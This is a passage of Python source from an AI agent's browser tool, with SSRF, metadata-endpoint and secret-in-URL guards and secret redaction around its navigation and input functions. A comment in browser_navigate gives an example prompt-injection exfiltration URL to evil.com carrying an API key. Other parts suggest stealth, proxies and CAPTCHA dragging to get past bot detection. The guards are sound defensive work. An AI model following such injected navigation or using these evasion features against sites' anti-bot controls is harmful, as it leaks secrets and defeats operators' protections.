            "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
            command,
            task_id,
            fallback_reason,
        )
        # For screenshots, use the dedicated Chrome fallback helper
        # (spins up a separate Chrome session to the same URL).
        if command == "screenshot":
            fallback_result = _chrome_fallback_screenshot(task_id, args or [], timeout)
        else:
            fallback_result = _run_chrome_fallback_command(task_id, command, args, timeout)
        return _annotate_lightpanda_fallback(fallback_result, fallback_reason)

    # Persistent-profile mode: re-apply the configured viewport after every
    # successful navigation.  Window managers (Wayland/mutter) override the
    # requested window size, and a viewport set via CDP emulation survives
    # navigations but not browser relaunches — re-applying on "open" keeps
    # pages rendering at the configured aspect ratio in all cases.
    if (
        command == "open"
        and result.get("success")
        and session_info.get("features", {}).get("persistent_profile")
    ):
        viewport = _get_local_browser_settings()["viewport"]
        if viewport:
            vw, vh = viewport
            vp_result = _run_browser_command(
                task_id, "set", ["viewport", str(vw), str(vh)]
            )
            if not vp_result.get("success"):
                logger.debug("viewport re-apply failed: %s", vp_result.get("error"))

    return result


def _store_full_snapshot(snapshot_text: str) -> Optional[str]:
    """Write a full page snapshot to cache/web and return its absolute path.

    Called whenever a snapshot exceeds SNAPSHOT_SUMMARIZE_THRESHOLD and the
    model is about to receive a truncated or LLM-summarized view. Mirrors
    ``web_tools._store_full_text``: the file lands in the same cache/web
    directory (mounted read-only into remote backends via
    credential_files._CACHE_DIRS) so the agent's read_file/terminal tools can
    page through the complete accessibility tree — including element refs that
    the truncated view dropped — on any backend.

    The stored copy is secret-redacted (same force-redaction boundary as
    ``_redact_browser_output``) since page-rendered API keys or tokens must
    not be written to disk unmasked. The filename is keyed on a content hash,
    so repeated snapshots of the same page state dedupe to one file. Returns
    None on failure (storage is best-effort; the truncated view is still
    returned to the model).
    """
    try:
        import hashlib
        from hermes_constants import get_hermes_dir
        from agent.redact import redact_sensitive_text

        content = redact_sensitive_text(snapshot_text, force=True)
        if len(content) > MAX_STORED_SNAPSHOT_CHARS:
            content = (
                content[:MAX_STORED_SNAPSHOT_CHARS]
                + f"\n\n[... stored copy truncated at {MAX_STORED_SNAPSHOT_CHARS:,} chars "
                f"of {len(content):,} ...]"
            )
        from tools.spill_safety import ensure_spill_dir, write_text_exclusive

        cache_dir = get_hermes_dir("cache/web", "web_cache")
        ensure_spill_dir(cache_dir, private=False)
        digest = hashlib.sha256(content.encode("utf-8")).hexdigest()[:10]
        path = cache_dir / f"browser-snapshot-{digest}.txt"
        # Deterministic filename in a well-known dir: refuse symlinks via
        # lstat-unlink + exclusive create. Re-snapshotting the same page
        # state legitimately overwrites (same content-hash name). Not
        # private: cache/web is bind-mounted into remote backends whose
        # container UID must be able to read it.
        write_text_exclusive(path, content, private=False, overwrite=True)
        return str(path)
    except Exception as exc:  # noqa: BLE001
        logger.debug("Failed to store full browser snapshot: %s", exc)
        return None


def _truncate_snapshot(snapshot_text: str, max_chars: Optional[int] = None) -> str:
    """Structure-aware truncation for snapshots.

    Cuts at line boundaries so that accessibility tree elements are never
    split mid-line. The full snapshot is saved to cache/web (same pattern as
    web_extract's truncate-and-store) and the appended note tells the agent
    exactly where the complete text lives and how to page through it with
    read_file — element refs beyond the cut are in the file, not lost.

    Args:
        snapshot_text: The snapshot text to truncate
        max_chars: Maximum characters to keep. Defaults to the configured
            ``browser.snapshot_threshold`` (see
            :func:`get_browser_snapshot_threshold`).

    Returns:
        Truncated text with a stored-full-text pointer if truncated
    """
    if max_chars is None:
        max_chars = get_browser_snapshot_threshold()
    if len(snapshot_text) <= max_chars:
        return snapshot_text

    stored_path = _store_full_snapshot(snapshot_text)

    lines = snapshot_text.split('\n')
    result: list[str] = []
    chars = 0
    # Reserve space for the truncation note (the stored-path variant is the
    # longer of the two). Clamp so tiny max_chars values still keep content.
    reserve = min(110 + len(stored_path or ""), max_chars // 2)
    for line in lines:
        if chars + len(line) + 1 > max_chars - reserve:
            break
        result.append(line)
        chars += len(line) + 1
    remaining = len(lines) - len(result)
    if remaining > 0:
        if stored_path:
            next_line = len(result) + 1
            result.append(
                f'\n[... {remaining} more lines truncated — full snapshot: '
                f'read_file path="{stored_path}" offset={next_line} limit=200]'
            )
        else:
            result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
    return '\n'.join(result)


def _redact_browser_output(value: Any) -> Any:
    """Redact secrets from browser-originated data before returning to the model.

    Browser snapshots, console messages, JS exceptions, and eval results can
    contain page-rendered API keys, cookies, bearer tokens, or pasted secrets.
    Tool output is a model boundary, so force redaction here even if global log
    redaction is disabled for debugging.
    """
    from agent.redact import redact_sensitive_text

    if isinstance(value, str):
        return redact_sensitive_text(value, force=True)
    if isinstance(value, list):
        return [_redact_browser_output(item) for item in value]
    if isinstance(value, tuple):
        return tuple(_redact_browser_output(item) for item in value)
    if isinstance(value, dict):
        return {key: _redact_browser_output(item) for key, item in value.items()}
    return value


# ============================================================================
# Browser Tool Functions
# ============================================================================

def evaluate_url_safety(url: str) -> Optional[dict]:
    """Run URL safety checks; None if safe, else an error dict"""
    import urllib.parse
    from agent.redact import _PREFIX_RE

    _secret = {"success": False, "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs."}
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
        return _secret
    url = _normalize_url_for_request(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
        return _secret

    local = _is_local_backend()
    sensitive_query_key = _sensitive_query_param_name(url)
    if sensitive_query_key and not local:
        return {"success": False, "error": (
            "Blocked: URL contains a credential-like query parameter "
            f"({sensitive_query_key}). Cloud browser backends are third-party "
            "readers; use a local browser/CDP session or remove the sensitive "
            "query parameter before navigating.")}
    if _is_always_blocked_url(url):
        return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
    if not local and not _allow_private_urls() and not _is_safe_url(url):
        return {"success": False, "error": "Blocked: URL targets a private or internal address"}
    blocked = check_website_access(url)
    if blocked:
        return {"success": False, "error": blocked["message"],
                "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]}}
    return None


def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
    """
    Navigate to a URL in the browser.

    Args:
        url: The URL to navigate to
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result (includes stealth features info on first nav)
    """
    # Secret exfiltration protection — block URLs that embed API keys or
    # tokens in query parameters. A prompt injection could trick the agent
    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
    import urllib.parse
    from agent.redact import _PREFIX_RE
    url_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })
    url = _normalize_url_for_request(url)
    normalized_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(normalized_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })

    # SSRF protection — block private/internal addresses before navigating.
    # Skipped for local backends (Camofox, headless Chromium without a cloud
    # provider) because the agent already has full local network access via
    # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
    # local Chromium sidecar for this URL (cloud provider configured +
    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
    # cloud provider never sees the URL in that case.  Can also be opted
    # out globally via ``browser.allow_private_urls`` in config.
    effective_task_id = task_id or "default"
    nav_session_key = _navigation_session_key(effective_task_id, url)
    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)

    sensitive_query_key = _sensitive_query_param_name(url)
    if sensitive_query_key and not _is_local_backend() and not auto_local_this_nav:
        return json.dumps({
            "success": False,
            "error": (
                "Blocked: URL contains a credential-like query parameter "
                f"({sensitive_query_key}). Cloud browser backends are third-party "
                "readers; use a local browser/CDP session or remove the sensitive "
                "query parameter before navigating."
            ),
        })

    # Always-blocked floor: cloud metadata / IMDS endpoints are denied
    # regardless of backend, hybrid routing, or allow_private_urls.
    # There's no legitimate agent use case for navigating to
    # 169.254.169.254 / metadata.google.internal / ECS task metadata
    # via a browser, and routing those to a local Chromium sidecar
    # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
    # The floor is UNCONDITIONAL — it must fire for every backend,
    # including the pure-local headless Chromium and off-host CDP cases
    # (a local Chromium on a cloud VM still reaches the host IMDS).
    if _is_always_blocked_url(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a cloud metadata endpoint",
        })

    if (
        not _is_local_backend()
        and not auto_local_this_nav
        and not _allow_private_urls()
        and not _is_safe_url(url)
    ):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a private or internal address",
        })

    # Website policy check — block before navigating
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({
            "success": False,
            "error": blocked["message"],
            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
        })

    # Camofox backend — delegate after safety checks pass
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_navigate
        return camofox_navigate(url, task_id)

    if auto_local_this_nav:
        logger.info(
            "browser_navigate: auto-routing %s to local Chromium sidecar "
            "(cloud provider %s stays on cloud for public URLs; "
            "set browser.auto_local_for_private_urls: false to disable)",
            url,
            type(_get_cloud_provider()).__name__ if _get_cloud_provider() else "none",
        )

    # Get session info to check if this is a new session
    # (will create one with features logged if not exists)
    session_info = _get_session_info(nav_session_key)
    is_first_nav = session_info.get("_first_nav", True)

    # Auto-start recording if configured and this is first navigation
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(nav_session_key)

    result = _run_browser_command(
        nav_session_key,
        "open",
        [url],
        timeout=_get_open_command_timeout(first_open=is_first_nav),
    )

    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

        # Post-redirect SSRF check — if the browser followed a redirect to a
        # private/internal address, block the result so the model can't read
        # internal content via subsequent browser_snapshot calls.
        # Skipped for local backends (same rationale as the pre-nav check),
        # and for the hybrid local sidecar (we're already on a local browser
        # hitting a private URL by design).
        # Always-blocked floor (cloud metadata / IMDS) is enforced for every
        # backend and even when auto_local_this_nav is true — see pre-nav
        # check for rationale (#16234).
        if (
            final_url
            and final_url != url
            and _is_always_blocked_url(final_url)
        ):
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a cloud metadata endpoint",
            })

        if (
            not _is_local_backend()
            and not auto_local_this_nav
            and not _allow_private_urls()
            and final_url and final_url != url and not _is_safe_url(final_url)
        ):
            # Navigate away to a blank page to prevent snapshot leaks
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a private/internal address",
            })

        response = {
            "success": True,
            "url": final_url,
            "title": title
        }
        # Auditability: stamp navigations that ran on the user's real-profile
        # copy-browser so usage is visible in the tool result.
        try:
            if (session_info.get("features") or {}).get("real_profile"):
                response["used_real_profile"] = True
        except Exception:
            pass
        # Remember only a successful, non-blocked navigation as the task owner.
        # Failed opens and blocked redirects must not retarget follow-up clicks
        # or snapshots to a newly-created but irrelevant session.
        _last_active_session_key[effective_task_id] = nav_session_key
        _copy_fallback_warning(response, result)

        # Detect common "blocked" page patterns from title/url
        blocked_patterns = [
            "access denied", "access to this page has been denied",
            "blocked", "bot detected", "verification required",
            "please verify", "are you a robot", "captcha",
            "cloudflare", "ddos protection", "checking your browser",
            "just a moment", "attention required"
        ]
        title_lower = title.lower()

        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
                "4) Some sites have very aggressive bot detection that may be unavoidable."
            )

        # Include feature info on first navigation so model knows what's active
        if is_first_nav and "features" in session_info:
            features = session_info["features"]
            active_features = [k for k, v in features.items() if v]
            if not features.get("proxies"):
                response["stealth_warning"] = (
                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
                    "Consider upgrading Browserbase plan for proxy support."
                )
            response["stealth_features"] = active_features

        # Auto-take a compact snapshot so the model can act immediately
        # without a separate browser_snapshot call.
        try:
            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                threshold = get_browser_snapshot_threshold()
                if len(snapshot_text) > threshold:
                    snapshot_text = _truncate_snapshot(snapshot_text, max_chars=threshold)
                response["snapshot"] = _redact_browser_output(snapshot_text)
                response["element_count"] = len(refs) if refs else 0
                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                    _copy_fallback_warning(response, snap_result)
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Navigation failed")
        }, ensure_ascii=False)


def browser_snapshot(
    full: bool = False,
    task_id: Optional[str] = None,
    user_task: Optional[str] = None
) -> str:
    """
    Get a text-based snapshot of the current page's accessibility tree.

    Args:
        full: If True, return complete snapshot. If False, return compact view.
        task_id: Task identifier for session isolation
        user_task: Deprecated — accepted for call-site compatibility, unused.
            Oversized snapshots always truncate-and-store (no LLM pass).

    Returns:
        JSON string with page snapshot
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_snapshot
        return camofox_snapshot(full, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Build command args based on full flag
    args = []
    if not full:
        args.extend(["-c"])  # Compact mode

    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        # ── Private-network guard: block snapshots from eval-navigated private pages ──
        # After any eval (browser_console) that may have changed location.href to a
        # private/internal address, the snapshot would expose private page content.
        # Re-check the current URL before returning the snapshot.
        if (
            not _is_local_backend()
            and not _is_local_sidecar_key(effective_task_id)
            and not _allow_private_urls()
        ):
            try:
                _url_result = _run_browser_command(
                    effective_task_id, "eval", ["window.location.href"],
                    timeout=5, _engine_override="auto",
                )
                if _url_result.get("success"):
                    _current_url = (
                        _url_result.get("data", {}).get("result", "")
                        .strip().strip('"').strip("'")
                    )
                    if _current_url and not _is_safe_url(_current_url):
                        return json.dumps({
                            "success": False,
                            "error": (
                                "Blocked: page URL targets a private or internal address "
                                f"({_current_url}). This may have been caused by a "
                                "JavaScript navigation via browser_console."
                            ),
                        }, ensure_ascii=False)
            except Exception as _url_exc:
                logger.debug("browser_snapshot: URL safety check failed (%s)", _url_exc)

        # Oversized snapshots truncate at line boundaries; the full
        # accessibility tree is stored to cache/web and the appended note
        # tells the agent how to page through it with read_file (same
        # pattern as web_extract — no LLM summarization). Threshold is
        # configurable via browser.snapshot_threshold.
        threshold = get_browser_snapshot_threshold()
        if len(snapshot_text) > threshold:
            snapshot_text = _truncate_snapshot(snapshot_text, max_chars=threshold)

        response = {
            "success": True,
            "snapshot": _redact_browser_output(snapshot_text),
            "element_count": len(refs) if refs else 0
        }
        _copy_fallback_warning(response, result)

        # Blank-active-tab steer: agent-browser auto-activates newly opened tabs,
        # so a spurious about:blank / new-tab popup (login / 2FA flows) leaves the
        # snapshot empty and strands the agent. When another tab still holds real
        # content, surface it so the model switches back with browser_tab. Additive
        # only — runs solely on an empty snapshot, never forces a switch. (2026-07-19)
        _snap_txt = (response.get("snapshot") or "").strip()
        if response.get("element_count", 0) == 0 and _snap_txt in ("", "(empty page)"):
            _hint = _blank_tab_recovery_hint(effective_task_id)
            if _hint is not None:
                response["tab_recovery"] = _hint

        # Merge supervisor state (pending dialogs + frame tree) when a CDP
        # supervisor is attached to this task. No-op otherwise. See
        # website/docs/developer-guide/browser-supervisor.md.
        try:
            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
            if _supervisor is not None:
                _sv_snap = _supervisor.snapshot()
                if _sv_snap.active:
                    response.update(_redact_browser_output(_sv_snap.to_dict()))
        except Exception as _sv_exc:
            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)

        return json.dumps(response, ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get snapshot")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_click(ref: str, task_id: Optional[str] = None) -> str:
    """
    Click on an element.

    Args:
        ref: Element reference (e.g., "@e5")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with click result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_click
        return camofox_click(ref, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "click")
    if blocked is not None:
        return blocked

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    result = _run_browser_command(effective_task_id, "click", [ref])

    if result.get("success"):
        response = {
            "success": True,
            "clicked": ref
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to click {ref}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def _fmt_coord(value: float) -> str:
    """Format a coordinate/delta for agent-browser mouse commands.

    agent-browser's `mouse move`/`mouse wheel` argument parser rejects
    floating-point strings ("100.0" -> 'missing arguments'); it only accepts
    integers.  Round to the nearest whole pixel.
    """
    return str(int(round(float(value))))


def _resolve_viewport_point(
    task_id: str,
    ref: Optional[str] = None,
    selector: Optional[str] = None,
    x: Optional[float] = None,
    y: Optional[float] = None,
) -> tuple:
    """Resolve a target to viewport coordinates (center of the element box).

    Returns (x, y, None) on success or (None, None, error_message) on failure.
    Explicit coordinates win over ref/selector.
    """
    if x is not None and y is not None:
        return float(x), float(y), None
    target = _normalize_ref(ref) if ref else (selector or "").strip()
    if not target:
        return None, None, "Provide a ref, a selector, or x/y coordinates"
    result = _run_browser_command(task_id, "get", ["box", target])
    if not result.get("success"):
        return None, None, result.get("error", f"Could not resolve position of {target}")
    box = result.get("data", {}) or {}
    try:
        cx = float(box["x"]) + float(box.get("width", 0)) / 2
        cy = float(box["y"]) + float(box.get("height", 0)) / 2
    except (KeyError, TypeError, ValueError):
        return None, None, f"Element {target} returned no usable bounding box"
    return round(cx, 1), round(cy, 1), None


def browser_drag(
    from_ref: Optional[str] = None,
    to_ref: Optional[str] = None,
    from_selector: Optional[str] = None,
    to_selector: Optional[str] = None,
    from_x: Optional[float] = None,
    from_y: Optional[float] = None,
    to_x: Optional[float] = None,
    to_y: Optional[float] = None,
    waypoints: Optional[list] = None,
    steps: Optional[int] = None,
    hold_ms: Optional[int] = None,
    release_delay_ms: Optional[int] = None,
    humanize: Optional[bool] = None,
    button: Optional[str] = None,
    task_id: Optional[str] = None,
) -> str:
    """
    Perform a real mouse drag (press -> move -> release).

    General-purpose: drag-and-drop, sliders, slider/puzzle CAPTCHAs, and canvas
    widgets. Provide a start and an end point, each as a ref, a CSS selector, or
    absolute viewport pixel coordinates.

    Returns:
        JSON string with the drag result (resolved from/to coordinates).
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_drag
        return camofox_drag(
            from_ref=from_ref, to_ref=to_ref,
            from_selector=from_selector, to_selector=to_selector,
            from_x=from_x, from_y=from_y, to_x=to_x, to_y=to_y,
            waypoints=waypoints, steps=steps, hold_ms=hold_ms,
            release_delay_ms=release_delay_ms, humanize=humanize,
            button=button, task_id=task_id,
        )

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "drag")
    if blocked is not None:
        return blocked

    # Element-to-element drag with no coordinate/path tuning maps straight
    # onto the native agent-browser `drag <src> <dst>` command.
    coords_given = any(v is not None for v in (from_x, from_y, to_x, to_y))
    if not coords_given and not waypoints:
        src = _normalize_ref(from_ref) if from_ref else from_selector
        dst = _normalize_ref(to_ref) if to_ref else to_selector
        if src and dst:
            result = _run_browser_command(effective_task_id, "drag", [src, dst])
            if result.get("success"):
                return json.dumps({"success": True, "from": src, "to": dst},
                                  ensure_ascii=False)
            return json.dumps({
                "success": False,
                "error": result.get("error", f"Failed to drag {src} to {dst}"),
            }, ensure_ascii=False)

    # Coordinate path (sliders, canvas, CAPTCHAs): synthesize the drag with
    # raw mouse events — move, press, interpolated moves, release.
    fx, fy, err = _resolve_viewport_point(
        effective_task_id, ref=from_ref, selector=from_selector, x=from_x, y=from_y)
    if err:
        return json.dumps({"success": False, "error": f"drag start: {err}"},
                          ensure_ascii=False)
    tx, ty, err = _resolve_viewport_point(
        effective_task_id, ref=to_ref, selector=to_selector, x=to_x, y=to_y)
    if err:
        return json.dumps({"success": False, "error": f"drag end: {err}"},
                          ensure_ascii=False)

    anchors = [(fx, fy)]
    for wp in (waypoints or []):
        try:
            if isinstance(wp, dict):
                anchors.append((float(wp["x"]), float(wp["y"])))
            else:
                anchors.append((float(wp[0]), float(wp[1])))
        except (KeyError, IndexError, TypeError, ValueError):
            return json.dumps({
                "success": False,
                "error": f"Invalid waypoint {wp!r} (want {{'x': .., 'y': ..}})",
            }, ensure_ascii=False)
    anchors.append((tx, ty))

    n_steps = max(2, int(steps) if steps else 12)
    btn_args = [button] if button else []

    def _mouse(action: str, extra: List[str]) -> Dict[str, Any]:
        return _run_browser_command(effective_task_id, "mouse", [action] + extra)

    import time as _time
    sequence_error = None
    result = _mouse("move", [_fmt_coord(fx), _fmt_coord(fy)])
    if result.get("success"):
        result = _mouse("down", btn_args)
    if result.get("success"):
        if hold_ms:
            _time.sleep(min(int(hold_ms), 5000) / 1000)
        total_legs = len(anchors) - 1
        steps_per_leg = max(1, n_steps // total_legs)
        for i in range(total_legs):
            ax, ay = anchors[i]
            bx, by = anchors[i + 1]
            for s in range(1, steps_per_leg + 1):
                t = s / steps_per_leg
                mx, my = ax + (bx - ax) * t, ay + (by - ay) * t
                result = _mouse("move", [_fmt_coord(mx), _fmt_coord(my)])
                if not result.get("success"):
                    sequence_error = result.get("error")
                    break
            if sequence_error:
                break
        if not sequence_error and release_delay_ms:
            _time.sleep(min(int(release_delay_ms), 5000) / 1000)
    else:
        sequence_error = result.get("error")
    # Always release the button, even after a mid-drag failure — a stuck
    # pressed button corrupts every subsequent click in the session.
    up_result = _mouse("up", btn_args)
    if sequence_error is None and not result.get("success"):
        sequence_error = result.get("error")
    if sequence_error is None and not up_result.get("success"):
        sequence_error = up_result.get("error")

    if sequence_error:
        return json.dumps({"success": False, "error": f"Drag failed: {sequence_error}"},
                          ensure_ascii=False)
    return json.dumps({
        "success": True,
        "from": {"x": fx, "y": fy},
        "to": {"x": tx, "y": ty},
        "steps": n_steps,
    }, ensure_ascii=False)


def browser_mouse_wheel(
    delta_y: Optional[float] = None,
    delta_x: Optional[float] = None,
    ref: Optional[str] = None,
    x: Optional[float] = None,
    y: Optional[float] = None,
    task_id: Optional[str] = None,
) -> str:
    """
    Scroll a nested/inner scrollable container with a real mouse wheel event.

    Targets an element ref (preferred), explicit x/y viewport coordinates, or the
    viewport centre. Use for virtualised feeds, chat/message lists, dropdowns and
    maps that ignore page-level browser_scroll.

    Returns:
        JSON string with the resolved wheel coordinates.
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_mouse_wheel
        return camofox_mouse_wheel(
            delta_y=delta_y or 0, delta_x=delta_x or 0,
            ref=ref, x=x, y=y, task_id=task_id,
        )

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "scroll")
    if blocked is not None:
        return blocked

    # Position the cursor over the target first — wheel events land at the
    # current mouse position, and inner scrollables only react when hovered.
    px, py = None, None
    if ref or (x is not None and y is not None):
        px, py, err = _resolve_viewport_point(effective_task_id, ref=ref, x=x, y=y)
        if err:
            return json.dumps({"success": False, "error": err}, ensure_ascii=False)
        move_result = _run_browser_command(
            effective_task_id, "mouse", ["move", _fmt_coord(px), _fmt_coord(py)])
        if not move_result.get("success"):
            return json.dumps({
                "success": False,
                "error": move_result.get("error", "Failed to move mouse to target"),
            }, ensure_ascii=False)

    result = _run_browser_command(
        effective_task_id, "mouse",
        ["wheel", _fmt_coord(delta_y or 0), _fmt_coord(delta_x or 0)])
    if result.get("success"):
        response = {"success": True, "delta_y": delta_y or 0, "delta_x": delta_x or 0}
        if px is not None:
            response["at"] = {"x": px, "y": py}
        return json.dumps(response, ensure_ascii=False)
    return json.dumps({
        "success": False,
        "error": result.get("error", "Mouse wheel failed"),
    }, ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
    """
    Type text into an input field.

    Args:
        ref: Element reference (e.g., "@e3")
        text: Text to type
        task_id: Task identifier for session isolation

    Returns:
        JSON string with type result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_type
        return camofox_type(ref, text, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "type")
    if blocked is not None:
        return blocked

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    # Use fill command (clears then types)
    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    from agent.display import (
        redact_browser_typed_text_for_display,
        redact_tool_args_for_display,
    )

    display_text = (redact_tool_args_for_display("browser_type", {"text": text}) or {})["text"]

    if result.get("success"):
        response = {
            "success": True,
            # Run typed text through the secret-pattern redactor so API keys /
            # tokens don't leak into tool progress or chat history.  Normal
            # text passes through unchanged.  The raw value was already sent
            # to the browser command above.
            "typed": display_text,
            "element": ref
        }
        response = _copy_fallback_warning(response, result)
        response = redact_browser_typed_text_for_display(response, text)
        return json.dumps(response, ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to type into {ref}")
        }
        response = _copy_fallback_warning(response, result)
        response = redact_browser_typed_text_for_display(response, text)
        return json.dumps(response, ensure_ascii=False)


def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
    """
    Scroll the page.

    Args:
        direction: "up" or "down"
        task_id: Task identifier for session isolation

    Returns:
        JSON string with scroll result
    """
    # Validate direction
    if direction not in {"up", "down"}:
        return json.dumps({
            "success": False,
            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
        }, ensure_ascii=False)

    # Single scroll with pixel amount instead of 5x subprocess calls.
    # agent-browser supports: agent-browser scroll down 500
    # ~500px is roughly half a viewport of travel.
    _SCROLL_PIXELS = 500

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_scroll
        # Camofox REST API doesn't support pixel args; use repeated calls
        _SCROLL_REPEATS = 5
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = _last_session_key(task_id or "default")

    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    if not result.get("success"):
        response = {
            "success": False,
            "error": result.get("error", f"Failed to scroll {direction}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {
        "success": True,
        "scrolled": direction
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_back(task_id: Optional[str] = None) -> str:
    """
    Navigate back in browser history.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_back
        return camofox_back(task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success"):
        # Browser history can land on a private/internal/cloud-metadata
        # address that the browser_navigate preflight never saw (e.g. a
        # redirect chain from an earlier legitimate navigation touched an
        # internal host, or client-side history was otherwise manipulated).
        # Re-check post-navigation, matching every other content-returning
        # entry point (browser_snapshot/vision/console/eval, and click/type/
        # press via _blocked_private_page_action) — the floor must fire for
        # every backend, not just the initial navigate.
        if _eval_ssrf_guard_active(effective_task_id):
            _blocked_url = _current_page_private_url(effective_task_id)
            if _blocked_url:
                return json.dumps({
                    "success": False,
                    "error": (
                        "Blocked: page URL targets a private or internal address "
                        f"({_blocked_url}). Browser history navigation (back) "
                        "landed on this address."
                    ),
                }, ensure_ascii=False)
        data = result.get("data", {})
        response = {
            "success": True,
            "url": data.get("url", "")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to go back")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_press(key: str, task_id: Optional[str] = None) -> str:
    """
    Press a keyboard key.

    Args:
        key: Key to press (e.g., "Enter", "Tab")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with key press result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_press
        return camofox_press(key, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "press")
    if blocked is not None:
        return blocked
    result = _run_browser_command(effective_task_id, "press", [key])

    if result.get("success"):
        response = {
            "success": True,
            "pressed": key
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to press {key}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def _blocked_private_page_action(effective_task_id: str, action: str) -> Optional[str]:
    """Return a blocked payload when an unsafe cloud page would receive input."""
    if not _eval_ssrf_guard_active(effective_task_id):
        return None
    blocked_url = _current_page_private_url(effective_task_id)
    if not blocked_url:
        return None
